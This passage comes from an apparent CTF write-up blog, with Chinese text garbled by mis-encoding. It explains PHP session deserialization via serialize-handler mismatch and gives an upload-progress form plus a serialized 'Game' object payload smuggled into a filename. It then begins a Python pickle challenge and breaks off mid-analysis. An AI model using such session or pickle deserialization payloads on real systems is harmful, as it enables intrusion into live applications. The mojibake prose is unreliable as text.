</div><h5 id="sessionæœºåˆ¶å¯¹åºåˆ—åŒ–çš„ä¸‰ç§ä¸åŒå¤„ç†å™¨">sessionæœºåˆ¶å¯¹åºåˆ—åŒ–çš„ä¸‰ç§ä¸åŒå¤„ç†å™¨</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_binary
</span></span><span class="line"><span class="cl">å­˜å‚¨æ–¹å¼ï¼šé”®åé•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">php
</span></span><span class="line"><span class="cl">å­˜å‚¨æ–¹å¼ï¼šé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">php_serialize(php&gt;5.5.4)
</span></span><span class="line"><span class="cl">å­˜å‚¨æ–¹å¼ï¼šç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼
</span></span></code></pre></td></tr></table>
</div>
</div><p>å®ä¾‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//ini_set(&#34;session.serialize_handler&#34;, &#34;php_serialize&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1">//ini_set(&#34;session.serialize_handler&#34;, &#34;php_binary&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;lemon&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;pre&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;/pre&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php : lemon|s:3:&#34;abc&#34;;
</span></span><span class="line"><span class="cl">php_serialize : a:1:{s:5:&#34;lemon&#34;;s:3:&#34;abc&#34;;}
</span></span><span class="line"><span class="cl">php_binary : lemons:3:&#34;abc&#34;;
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="sessionååºåˆ—åŒ–æ¼æ´æˆå› ">sessionååºåˆ—åŒ–æ¼æ´æˆå› </h5>
<p>ä¸åŒçš„å¼•æ“å¯¹|ï¼ˆç®¡é“ç¬¦ï¼‰ä¼šæœ‰ä¸åŒçš„å¤„ç†ï¼Œphp_binaryæˆ–è€…php_serializeéƒ½ä¸ä¼šè¯†åˆ«|ï¼Œè€Œä¸”å¯¹è¾“å…¥çš„å…·ä½“å€¼ä¸ä¼šå½“æˆä¸€ä¸ªç”±å¯¹è±¡åºåˆ—åŒ–çš„å­—ç¬¦ä¸²æ¥ååºåˆ—åŒ–ï¼Œè€Œæ˜¯ç›´æ¥æŠŠè¾“å…¥çš„å­—ç¬¦ä¸²å½“æˆä¸€ä¸ªå…·ä½“çš„å€¼æ¥ååºåˆ—åŒ–ã€‚ç„¶è€Œphpä¼šæŠŠ|åçš„å­—ç¬¦ä¸²å½“æˆä¸€ä¸ªç”±å¯¹è±¡åºåˆ—åŒ–çš„å­—ç¬¦ä¸²æ¥ååºåˆ—åŒ–ã€‚</p>
<p>ä¸ºä»€ä¹ˆåœ¨è§£æsessionæ–‡ä»¶æ—¶ï¼Œphpç›´æ¥å¯¹&rsquo;|&lsquo;åçš„å€¼è¿›è¡Œååºåˆ—åŒ–å¤„ç†ï¼Ÿ</p>
<blockquote>
<p>å½“ä¼šè¯è‡ªåŠ¨å¼€å§‹æˆ–è€…é€šè¿‡session_start()æ‰‹åŠ¨å¼€å§‹çš„æ—¶å€™ï¼Œphpå†…éƒ¨ä¼šè°ƒç”¨ä¼šè¯ç®¡ç†å™¨çš„openå’Œreadå›è°ƒå‡½æ•°ã€‚ä¼šè¯ç®¡ç†å™¨å¯èƒ½æ˜¯phpé»˜è®¤çš„ï¼Œä¹Ÿå¯èƒ½æ˜¯æ‰©å±•æä¾›çš„ï¼ˆSQLite æˆ–è€… Memcachedæ‰©å±•ï¼‰ï¼Œä¹Ÿå¯èƒ½æ˜¯é€šè¿‡session_set_save_handler()è®¾å®šçš„ç”¨æˆ·è‡ªå®šä¹‰ä¼šè¯ç®¡ç†å™¨ã€‚é€šè¿‡ read å›è°ƒå‡½æ•°è¿”å›çš„ç°æœ‰ä¼šè¯æ•°æ®ï¼ˆä½¿ç”¨ç‰¹æ®Šçš„åºåˆ—åŒ–æ ¼å¼å­˜å‚¨ï¼‰ï¼Œphpä¼šè‡ªåŠ¨ååºåˆ—åŒ–æ•°æ®å¹¶å¡«å……$_SESSIONè¶…çº§å…¨å±€å˜é‡ã€‚</p>
</blockquote>
<h5 id="upload_processæœºåˆ¶">upload_processæœºåˆ¶</h5>
<p>æ²¡æœ‰$_SESSIONå˜é‡èµ‹å€¼,æ€ä¹ˆè§£å†³ï¼Ÿ</p>
<p>phpå­˜åœ¨ä¸€ä¸ªupload_processæœºåˆ¶ï¼Œå³è‡ªåŠ¨åœ¨$_SESSIONä¸­åˆ›å»ºä¸€ä¸ªé”®å€¼å¯¹ï¼Œå€¼ä¸­åˆšå¥½å­˜åœ¨ç”¨æˆ·å¯æ§çš„éƒ¨åˆ†ã€‚</p>
<p>å†™å…¥çš„æ–¹å¼ä¸»è¦æ˜¯åˆ©ç”¨PHPä¸­Session Upload Progressæ¥è¿›è¡Œè®¾ç½®ï¼Œå…·ä½“ä¸ºï¼Œåœ¨ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œå¦‚æœPOSTä¸€ä¸ªåä¸ºPHP_SESSION_UPLOAD_PROGRESSçš„å˜é‡ï¼Œå°±å¯ä»¥å°†filenameçš„å€¼èµ‹å€¼åˆ°sessionä¸­ã€‚</p>
<p>å‚è€ƒèµ„æ–™ï¼š<a class="link" href="https://www.cnblogs.com/zzjdbk/p/12995217.html"  target="_blank" rel="noopener"
    >sessionååºåˆ—åŒ–</a></p>
<h4 id="payload-1">payload</h4>
<h5 id="sessionæ–‡ä»¶ä¸Šä¼ è„šæœ¬è¿™é‡Œæˆ‘ä¸Šä¼ äº†ä¸€ä¸ªç©ºçš„textæ–‡ä»¶">sessionæ–‡ä»¶ä¸Šä¼ è„šæœ¬ï¼ˆè¿™é‡Œæˆ‘ä¸Šä¼ äº†ä¸€ä¸ªç©ºçš„textæ–‡ä»¶ï¼‰</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!doctype html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://8975c3dd-0e68-4b58-a425-abdf4c9f5da4.challenge.ctf.show/&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;123&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl"> 	<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="åºåˆ—åŒ–å­—ç¬¦ä¸²">åºåˆ—åŒ–å­—ç¬¦ä¸²</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">|O:4:&#34;Game&#34;:1:{s:3:&#34;log&#34;;s:22:&#34;/var/www/html/flag.php&#34;;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>filenameæ”¹ä¸ºå•å¼•å·ï¼Œç›´æ¥å°†æ–‡ä»¶åå†…å®¹æ”¹ä¸ºåºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚</p>
<p><img src="/images/%e5%89%aa%e5%88%80%e7%9f%b3%e5%a4%b4%e5%b8%83-4.png"
	
	
	
	loading="lazy"
	
	
></p>
<p>filenameä»ç„¶æ˜¯åŒå¼•å·ï¼Œå°†åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„åŒå¼•å·è¿›è¡Œè½¬ä¹‰ã€‚</p>
<p><img src="/D:%5cHugoWebsite%5cR1one%5cBlog%5cstatic%5cimages%5c%e5%89%aa%e5%88%80%e7%9f%b3%e5%a4%b4%e5%b8%83-5.png"
	
	
	
	loading="lazy"
	
	
></p>
<h2 id="baby_pickle">baby_pickle</h2>
<p><strong>æ‰“å¼€ç¯å¢ƒåçš„é¡µé¢æ˜¾ç¤º</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">æ¬¢è¿æ¥åˆ°æ–°æ‰‹æ‘new_rookie
</span></span><span class="line"><span class="cl">åªæœ‰æˆä¸ºå¤§èœé¸¡æ‰èƒ½å¾—åˆ°flag
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>é¢˜ç›®é™„ä»¶æºç </strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Author:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   Achilles</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Time:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   2022-9-20</span>
</span></span><span class="line"><span class="cl"><span class="c1"># For:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   ctfshow</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span><span class="o">,</span> <span class="nn">pickletools</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">id</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;ctfshow{&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span> <span class="o">+</span> <span class="s2">&#34;}&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Rookie</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="nb">id</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">id</span> <span class="o">=</span> <span class="nb">id</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">agent_show</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nb">id</span>
</span></span><span class="line"><span class="cl">    <span class="nb">id</span> <span class="o">=</span> <span class="nb">id</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">name</span> <span class="o">=</span> <span class="s2">&#34;new_rookie&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">new_rookie</span> <span class="o">=</span> <span class="n">Rookie</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="nb">id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;_info&#34;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">info</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">new_rookie</span><span class="p">,</span> <span class="n">protocol</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">info</span> <span class="o">=</span> <span class="n">pickletools</span><span class="o">.</span><span class="n">optimize</span><span class="p">(</span><span class="n">info</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">info</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;error&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;_info&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">user</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">message</span> <span class="o">=</span> <span class="s2">&#34;&lt;h1&gt;æ¬¢è¿æ¥åˆ°æ–°æ‰‹æ‘&#34;</span> <span class="o">+</span> <span class="n">user</span><span class="o">.</span><span class="n">name</span> <span class="o">+</span> <span class="s2">&#34;&lt;/h1&gt;</span><span class="se">\n</span><span class="s2">&lt;p&gt;&#34;</span> <span class="o">+</span> <span class="s2">&#34;åªæœ‰æˆä¸ºå¤§èœé¸¡æ‰èƒ½å¾—åˆ°flag&#34;</span> <span class="o">+</span> <span class="s2">&#34;&lt;/p&gt;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">message</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/dacaiji&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;_info&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">user</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">user</span><span class="o">.</span><span class="n">id</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">message</span> <span class="o">=</span> <span class="s2">&#34;&lt;h1&gt;ä½ ä¸æ˜¯å¤§èœé¸¡&lt;/h1&gt;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">message</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">message</span> <span class="o">=</span> <span class="s2">&#34;&lt;h1&gt;æ­å–œä½ æˆä¸ºå¤§èœé¸¡&lt;/h1&gt;</span><span class="se">\n</span><span class="s2">&lt;p&gt;&#34;</span> <span class="o">+</span> <span class="n">flag</span> <span class="o">+</span> <span class="s2">&#34;&lt;/p&gt;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">message</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/change&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">change_name</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">newname</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;newname&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">name</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&#34;_info&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">info</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;old_info ====================&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">info</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;name ====================&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;newname ====================&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">newname</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">info</span> <span class="o">=</span> <span class="n">info</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">newname</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">info</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">name</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">+</span> <span class="s2">&#34;_info&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">info</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;success&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8888</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="é¢˜ç›®åˆ†æ-2">é¢˜ç›®åˆ†æ</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># å…³é”®ä»£ç ï¼š
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="nx">user</span><span class="o">.</span><span class="nx">id</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nx">message</span> <span class="o">=</span> <span class="s2">&#34;&lt;h1&gt;ä½ ä¸æ˜¯å¤§èœé¸¡&lt;/h1&gt;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">message</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nx">message</span> <span class="o">=</span> <span class="s2">&#34;&lt;h1&gt;æ­å–œä½ æˆä¸ºå¤§èœé¸¡&lt;/h1&gt;</span><span class="se">\n</span><span class="s2">&lt;p&gt;&#34;</span> <span class="o">+</span> <span class="nx">flag</span> <span class="o">+</span> <span class="s2">&#34;&lt;/p&gt;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">message</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œè¦æƒ³å¾—åˆ°flagï¼Œéœ€è¦æˆä¸ºå¤§èœé¸¡ï¼Œå°±æ˜¯éœ€è¦id=0</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
